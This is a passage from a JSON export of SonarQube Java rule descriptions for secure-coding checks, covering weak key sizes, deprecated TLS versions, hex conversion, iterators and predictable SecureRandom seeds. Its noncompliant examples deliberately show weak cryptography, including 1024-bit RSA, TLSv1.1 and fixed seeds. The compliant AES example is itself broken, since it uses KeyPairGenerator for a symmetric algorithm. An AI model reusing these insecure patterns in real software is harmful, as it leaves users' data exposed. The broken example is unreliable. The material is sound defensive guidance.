general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this\ndata after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organizationâs ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the\nalgorithm.</p>\n<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,\na 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>\n<h4>Noncompliant code example</h4>\n<p>Here is an example of a private key generation with RSA:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\n\npublic static void main(String[] args) {\n    try {\n        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"RSA\");\n        keyPairGenerator.initialize(1024); // Noncompliant\n\n    } catch (NoSuchAlgorithmException e) {\n        // ...\n    }\n}\n</pre>\n<p>Here is an example of a private key generation with AES:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport java.security.KeyGenerator;\nimport java.security.NoSuchAlgorithmException;\n\npublic static void main(String[] args) {\n    try {\n        KeyGenerator keyGenerator = KeyGenerator.getInstance(\"AES\");\n        keyGenerator.initialize(64); // Noncompliant\n\n    } catch (NoSuchAlgorithmException e) {\n        // ...\n    }\n}\n</pre>\n<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve\nname:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.InvalidAlgorithmParameterException;\nimport java.security.spec.ECGenParameterSpec;\n\npublic static void main(String[] args) {\n    try {\n        KeyPairGenerator keyPairGenerator    = KeyPairGenerator.getInstance(\"EC\");\n        ECGenParameterSpec ellipticCurveName = new ECGenParameterSpec(\"secp112r1\"); // Noncompliant\n        keyPairGenerator.initialize(ellipticCurveName);\n\n    } catch (NoSuchAlgorithmException | InvalidAlgorithmParameterException e) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\n\npublic static void main(String[] args) {\n    try {\n        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"RSA\");\n        keyPairGenerator.initialize(2048);\n\n    } catch (NoSuchAlgorithmException e) {\n        // ...\n    }\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\n\npublic static void main(String[] args) {\n    try {\n        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"AES\");\n        keyPairGenerator.initialize(128);\n\n    } catch (NoSuchAlgorithmException e) {\n        // ...\n    }\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.InvalidAlgorithmParameterException;\nimport java.security.spec.ECGenParameterSpec;\n\npublic static void main(String[] args) {\n    try {\n        KeyPairGenerator keyPairGenerator    = KeyPairGenerator.getInstance(\"EC\");\n        ECGenParameterSpec ellipticCurveName = new ECGenParameterSpec(\"secp256r1\");\n        keyPairGenerator.initialize(ellipticCurveName);\n\n    } catch (NoSuchAlgorithmException | InvalidAlgorithmParameterException e) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>\n<p>The appropriate choices are the following.</p>\n<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>\n<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>\n<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of\n<strong>3072</strong> or <strong>4096</strong> should be preferred when possible.</p>\n<h4>AES (Advanced Encryption Standard)</h4>\n<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying\nall possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.\nTherefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>\n<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>\n<h4>Elliptic Curve Cryptography (ECC)</h4>\n<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve\nalgorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>\n<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>\n<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve\nparameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves\ncurrently include:</p>\n<ul>\n  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>\n  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>\n  <li> Curve448. </li>\n  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>\n</ul>\n<h3>Going the extra mile</h3>\n<h4>Pre-Quantum Cryptography</h4>\n<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep\nin mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or\n\"post-quantum\") counterpart.</p>\n<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>\n<p><a href=\"https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation\">Learn more here</a>.</p>\n<h2>Resources</h2>\n<ul>\n  <li> Documentation\n    <ul>\n      <li> NIST Documentation - <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf\">NIST SP 800-186: Recommendations\n      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>\n      <li> IETF - <a href=\"https://datatracker.ietf.org/doc/html/rfc5639\">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and\n      Curve Generation</a> </li>\n    </ul>  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-CRYPTO/\">Mobile AppSec Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m10-insufficient-cryptography\">Mobile Top 10 2024 Category M10 -\n  Insufficient Cryptography</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf\">NIST 800-131A</a> - Recommendation for Transitioning the\n  Use of Cryptographic Algorithms and Key Lengths </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4426","summary":"Cryptographic keys should be robust","tags":["cwe","privacy","rules"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Using <code>Integer.toHexString</code> is a common mistake when converting sequences of bytes into hexadecimal string representations. The problem\nis that the method trims leading zeroes, which can lead to wrong conversions. For instance a two bytes value of <code>0x4508</code> would be converted\ninto <code>45</code> and <code>8</code> which once concatenated would give <code>0x458</code>.</p>\n<p>This is particularly damaging when converting hash-codes and could lead to a security vulnerability.</p>\n<p>This rule raises an issue when <code>Integer.toHexString</code> is used in any kind of string concatenations.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nMessageDigest md = MessageDigest.getInstance(\"SHA-256\");\nbyte[] bytes = md.digest(password.getBytes(\"UTF-8\"));\n\nStringBuilder sb = new StringBuilder();\nfor (byte b : bytes) {\n    sb.append(Integer.toHexString( b &amp; 0xFF )); // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nMessageDigest md = MessageDigest.getInstance(\"SHA-256\");\nbyte[] bytes = md.digest(password.getBytes(\"UTF-8\"));\n\nStringBuilder sb = new StringBuilder();\nfor (byte b : bytes) {\n    sb.append(String.format(\"%02X\", b));\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/704\">CWE-704 - Incorrect Type Conversion or Cast</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#BAD_HEXA_CONVERSION\">BAD_HEXA_CONVERSION</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4425","summary":"\"Integer.toHexString\" should not be used to build hexadecimal strings","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organizationâs ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.net.ssl.SSLContext;\nimport java.security.NoSuchAlgorithmException;\n\npublic static void main(String[] args) {\n    try {\n        SSLContext.getInstance(\"TLSv1.1\"); // Noncompliant\n    } catch (NoSuchAlgorithmException e) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.net.ssl.SSLContext;\nimport java.security.NoSuchAlgorithmException;\n\npublic static void main(String[] args) {\n    try {\n        SSLContext.getInstance(\"TLSv1.2\");\n    } catch (NoSuchAlgorithmException e) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>How to fix it in OkHttp</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nimport okhttp3.ConnectionSpec;\nimport okhttp3.TlsVersion;\n\npublic static void main(String[] args) {\n    new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)\n          .tlsVersions(TlsVersion.TLS_1_1) // Noncompliant\n          .build();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nimport okhttp3.ConnectionSpec;\nimport okhttp3.TlsVersion;\n\npublic static void main(String[] args) {\n    new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)\n          .tlsVersions(TlsVersion.TLS_1_2)\n          .build();\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-CRYPTO/\">Mobile AppSec Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m5-insecure-communication\">Mobile Top 10 2024 Category M5 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4423","summary":"Weak SSL/TLS protocols should not be used","tags":["cwe","privacy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When implementing the <code>Comparable&lt;T&gt;.compareTo</code> method, the parameterâs type has to match the type used in the\n<code>Comparable</code> declaration. When a different type is used this creates an overload instead of an override, which is unlikely to be the\nintent.</p>\n<p>This rule raises an issue when the parameter of the <code>compareTo</code> method of a class implementing <code>Comparable&lt;T&gt;</code> is not\nsame as the one used in the <code>Comparable</code> declaration.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Foo {\n  static class Bar implements Comparable&lt;Bar&gt; {\n    public int compareTo(Bar rhs) {\n      return -1;\n    }\n  }\n\n  static class FooBar extends Bar {\n    public int compareTo(FooBar rhs) {  // Noncompliant: Parameter should be of type Bar\n      return 0;\n    }\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Foo {\n  static class Bar implements Comparable&lt;Bar&gt; {\n    public int compareTo(Bar rhs) {\n      return -1;\n    }\n  }\n\n  static class FooBar extends Bar {\n    public int compareTo(Bar rhs) {\n      return 0;\n    }\n  }\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4351","summary":"\"compareTo\" should not be overloaded","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When directly subclassing <code>java.io.OutputStream</code> or <code>java.io.FilterOutputStream</code>, the only requirement is that you implement\nthe method <code>write(int)</code>. However most uses for such streams donât write a single byte at a time and the default implementation for\n<code>write(byte[],int,int)</code> will call <code>write(int)</code> for every single byte in the array which can create a lot of overhead and is\nutterly inefficient. It is therefore strongly recommended that subclasses provide an efficient implementation of\n<code>write(byte[],int,int)</code>.</p>\n<p>This rule raises an issue when a direct subclass of <code>java.io.OutputStream</code> or <code>java.io.FilterOutputStream</code> doesnât provide an\noverride of <code>write(byte[],int,int)</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyStream extends OutputStream { // Noncompliant\n    private FileOutputStream fout;\n\n    public MyStream(File file) throws IOException {\n        fout = new FileOutputStream(file);\n    }\n\n    @Override\n    public void write(int b) throws IOException {\n        fout.write(b);\n    }\n\n    @Override\n    public void close() throws IOException {\n        fout.write(\"\\n\\n\".getBytes());\n        fout.close();\n        super.close();\n    }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class MyStream extends OutputStream {\n    private FileOutputStream fout;\n\n    public MyStream(File file) throws IOException {\n        fout = new FileOutputStream(file);\n    }\n\n    @Override\n    public void write(int b) throws IOException {\n        fout.write(b);\n    }\n\n    @Override\n    public void write(byte[] b, int off, int len) throws IOException {\n        fout.write(b, off, len);\n    }\n\n    @Override\n    public void close() throws IOException {\n        fout.write(\"\\n\\n\".getBytes());\n        fout.close();\n        super.close();\n    }\n}\n</pre>\n<h3>Exceptions</h3>\n<p>This rule doesnât raise an issue when the class is declared <code>abstract</code>.</p>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4349","summary":"\"write(byte[],int,int)\" should be overridden","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>An <code>Iterable</code> should not implement the <code>Iterator</code> interface or return <code>this</code> as an <code>Iterator</code>. The\nreason is that <code>Iterator</code> represents the iteration process itself, while <code>Iterable</code> represents the object we want to iterate\nover.</p>\n<p>The <code>Iterator</code> instance encapsulates state information of the iteration process, such as the current and next element. Consequently,\ndistinct iterations require distinct <code>Iterator</code> instances, for which <code>Iterable</code> provides the factory method\n<code>Iterable.iterator()</code>.</p>\n<p>This rule raises an issue when the <code>Iterable.iterator()</code> of a class implementing both <code>Iterable</code> and <code>Iterator</code>\nreturns <code>this</code>.</p>\n<h3>What is the potential impact?</h3>\n<p>The <code>Iterable.iterator()</code> method returning the same <code>Iterator</code> instance many times would have the following effects:</p>\n<ol>\n  <li> For subsequent iterations, e.g., two subsequent <code>for</code> loops with iterators over the same object, only the first one would iterate,\n  and the others would do nothing. </li>\n  <li> For nested iterations over the same object, the different iteration processes would affect each other because they only have a common, shared\n  state. </li>\n</ol>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass FooIterator implements Iterator&lt;Foo&gt;, Iterable&lt;Foo&gt; {\n  private Foo[] seq;\n  private int idx = 0;\n\n  public boolean hasNext() {\n    return idx &lt; seq.length;\n  }\n\n  public Foo next() {\n    return seq[idx++];\n  }\n\n  public Iterator&lt;Foo&gt; iterator() {\n    return this; // Noncompliant\n  }\n  // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass FooSequence implements Iterable&lt;Foo&gt; {\n  private Foo[] seq;\n\n  public Iterator&lt;Foo&gt; iterator() {\n    return new Iterator&lt;Foo&gt;() { // Compliant\n      private int idx = 0;\n\n      public boolean hasNext() {\n        return idx &lt; seq.length;\n      }\n\n      public Foo next() {\n        return seq[idx++];\n      }\n    };\n  }\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/7/docs/api/java/lang/Iterable.html\">Java SE 7 API Specification: java.lang.Iterable</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/7/docs/api/java/util/Iterator.html\">Java SE 7 API Specification: java.util.Iterator</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se7/html/jls-14.html#jls-14.14.2\">Java 7 Language Specification: The enhanced for\n  statement</a> (since Java 1.5) </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4348","summary":"\"iterator\" should not return \"this\"","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Cryptographic operations often rely on unpredictable random numbers to enhance security. These random numbers are created by cryptographically\nsecure pseudo-random number generators (CSPRNG). It is important not to use a predictable seed with these random number generators otherwise the\nrandom numbers will also become predictable.</p>\n<h2>Why is this an issue?</h2>\n<p>Random number generators are often used to generate random values for cryptographic algorithms. When a random number generator is used for\ncryptographic purposes, the generated numbers must be as random and unpredictable as possible. When the random number generator is improperly seeded\nwith a constant or a predictable value, its output will also be predictable.</p>\n<p>This can have severe security implications for cryptographic operations that rely on the randomness of the generated numbers. By using a\npredictable seed, an attacker can potentially guess or deduce the generated numbers, compromising the security of whatever cryptographic algorithm\nrelies on the random number generator.</p>\n<h3>What is the potential impact?</h3>\n<p>It is crucial to understand that the strength of cryptographic algorithms heavily relies on the quality of the random numbers used. By improperly\nseeding a CSPRNG, we introduce a significant weakness that can be exploited by attackers.</p>\n<h4>Insecure cryptographic keys</h4>\n<p>One of the primary use cases for CSPRNGs is generating cryptographic keys. If an attacker can predict the seed used to initialize the random number\ngenerator, they may be able to derive the same keys. Depending on the use case, this can lead to multiple severe outcomes, such as:</p>\n<ul>\n  <li> Being able to decrypt sensitive documents, leading to privacy breaches or identity theft. </li>\n  <li> Gaining access to a private key used for signing, allowing an attacker to forge digital signatures and impersonate legitimate entities. </li>\n  <li> Bypassing authentication mechanisms that rely on public-key infrastructure (PKI), which can be abused to gain unauthorized access to systems or\n  networks. </li>\n</ul>\n<h4>Session hijacking and man-in-the-middle attack</h4>\n<p>Another scenario where this vulnerability can be exploited is in the generation of session tokens or nonces for secure communication protocols. If\nan attacker can predict the seed used to generate these tokens, they can impersonate legitimate users or intercept sensitive information.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code uses a cryptographically strong random number generator to generate data that is not cryptographically strong.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nSecureRandom sr = new SecureRandom();\nsr.setSeed(123456L); // Noncompliant\nint v = sr.next(32);\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nSecureRandom sr = new SecureRandom(\"abcdefghijklmnop\".getBytes(\"us-ascii\")); // Noncompliant\nint v = 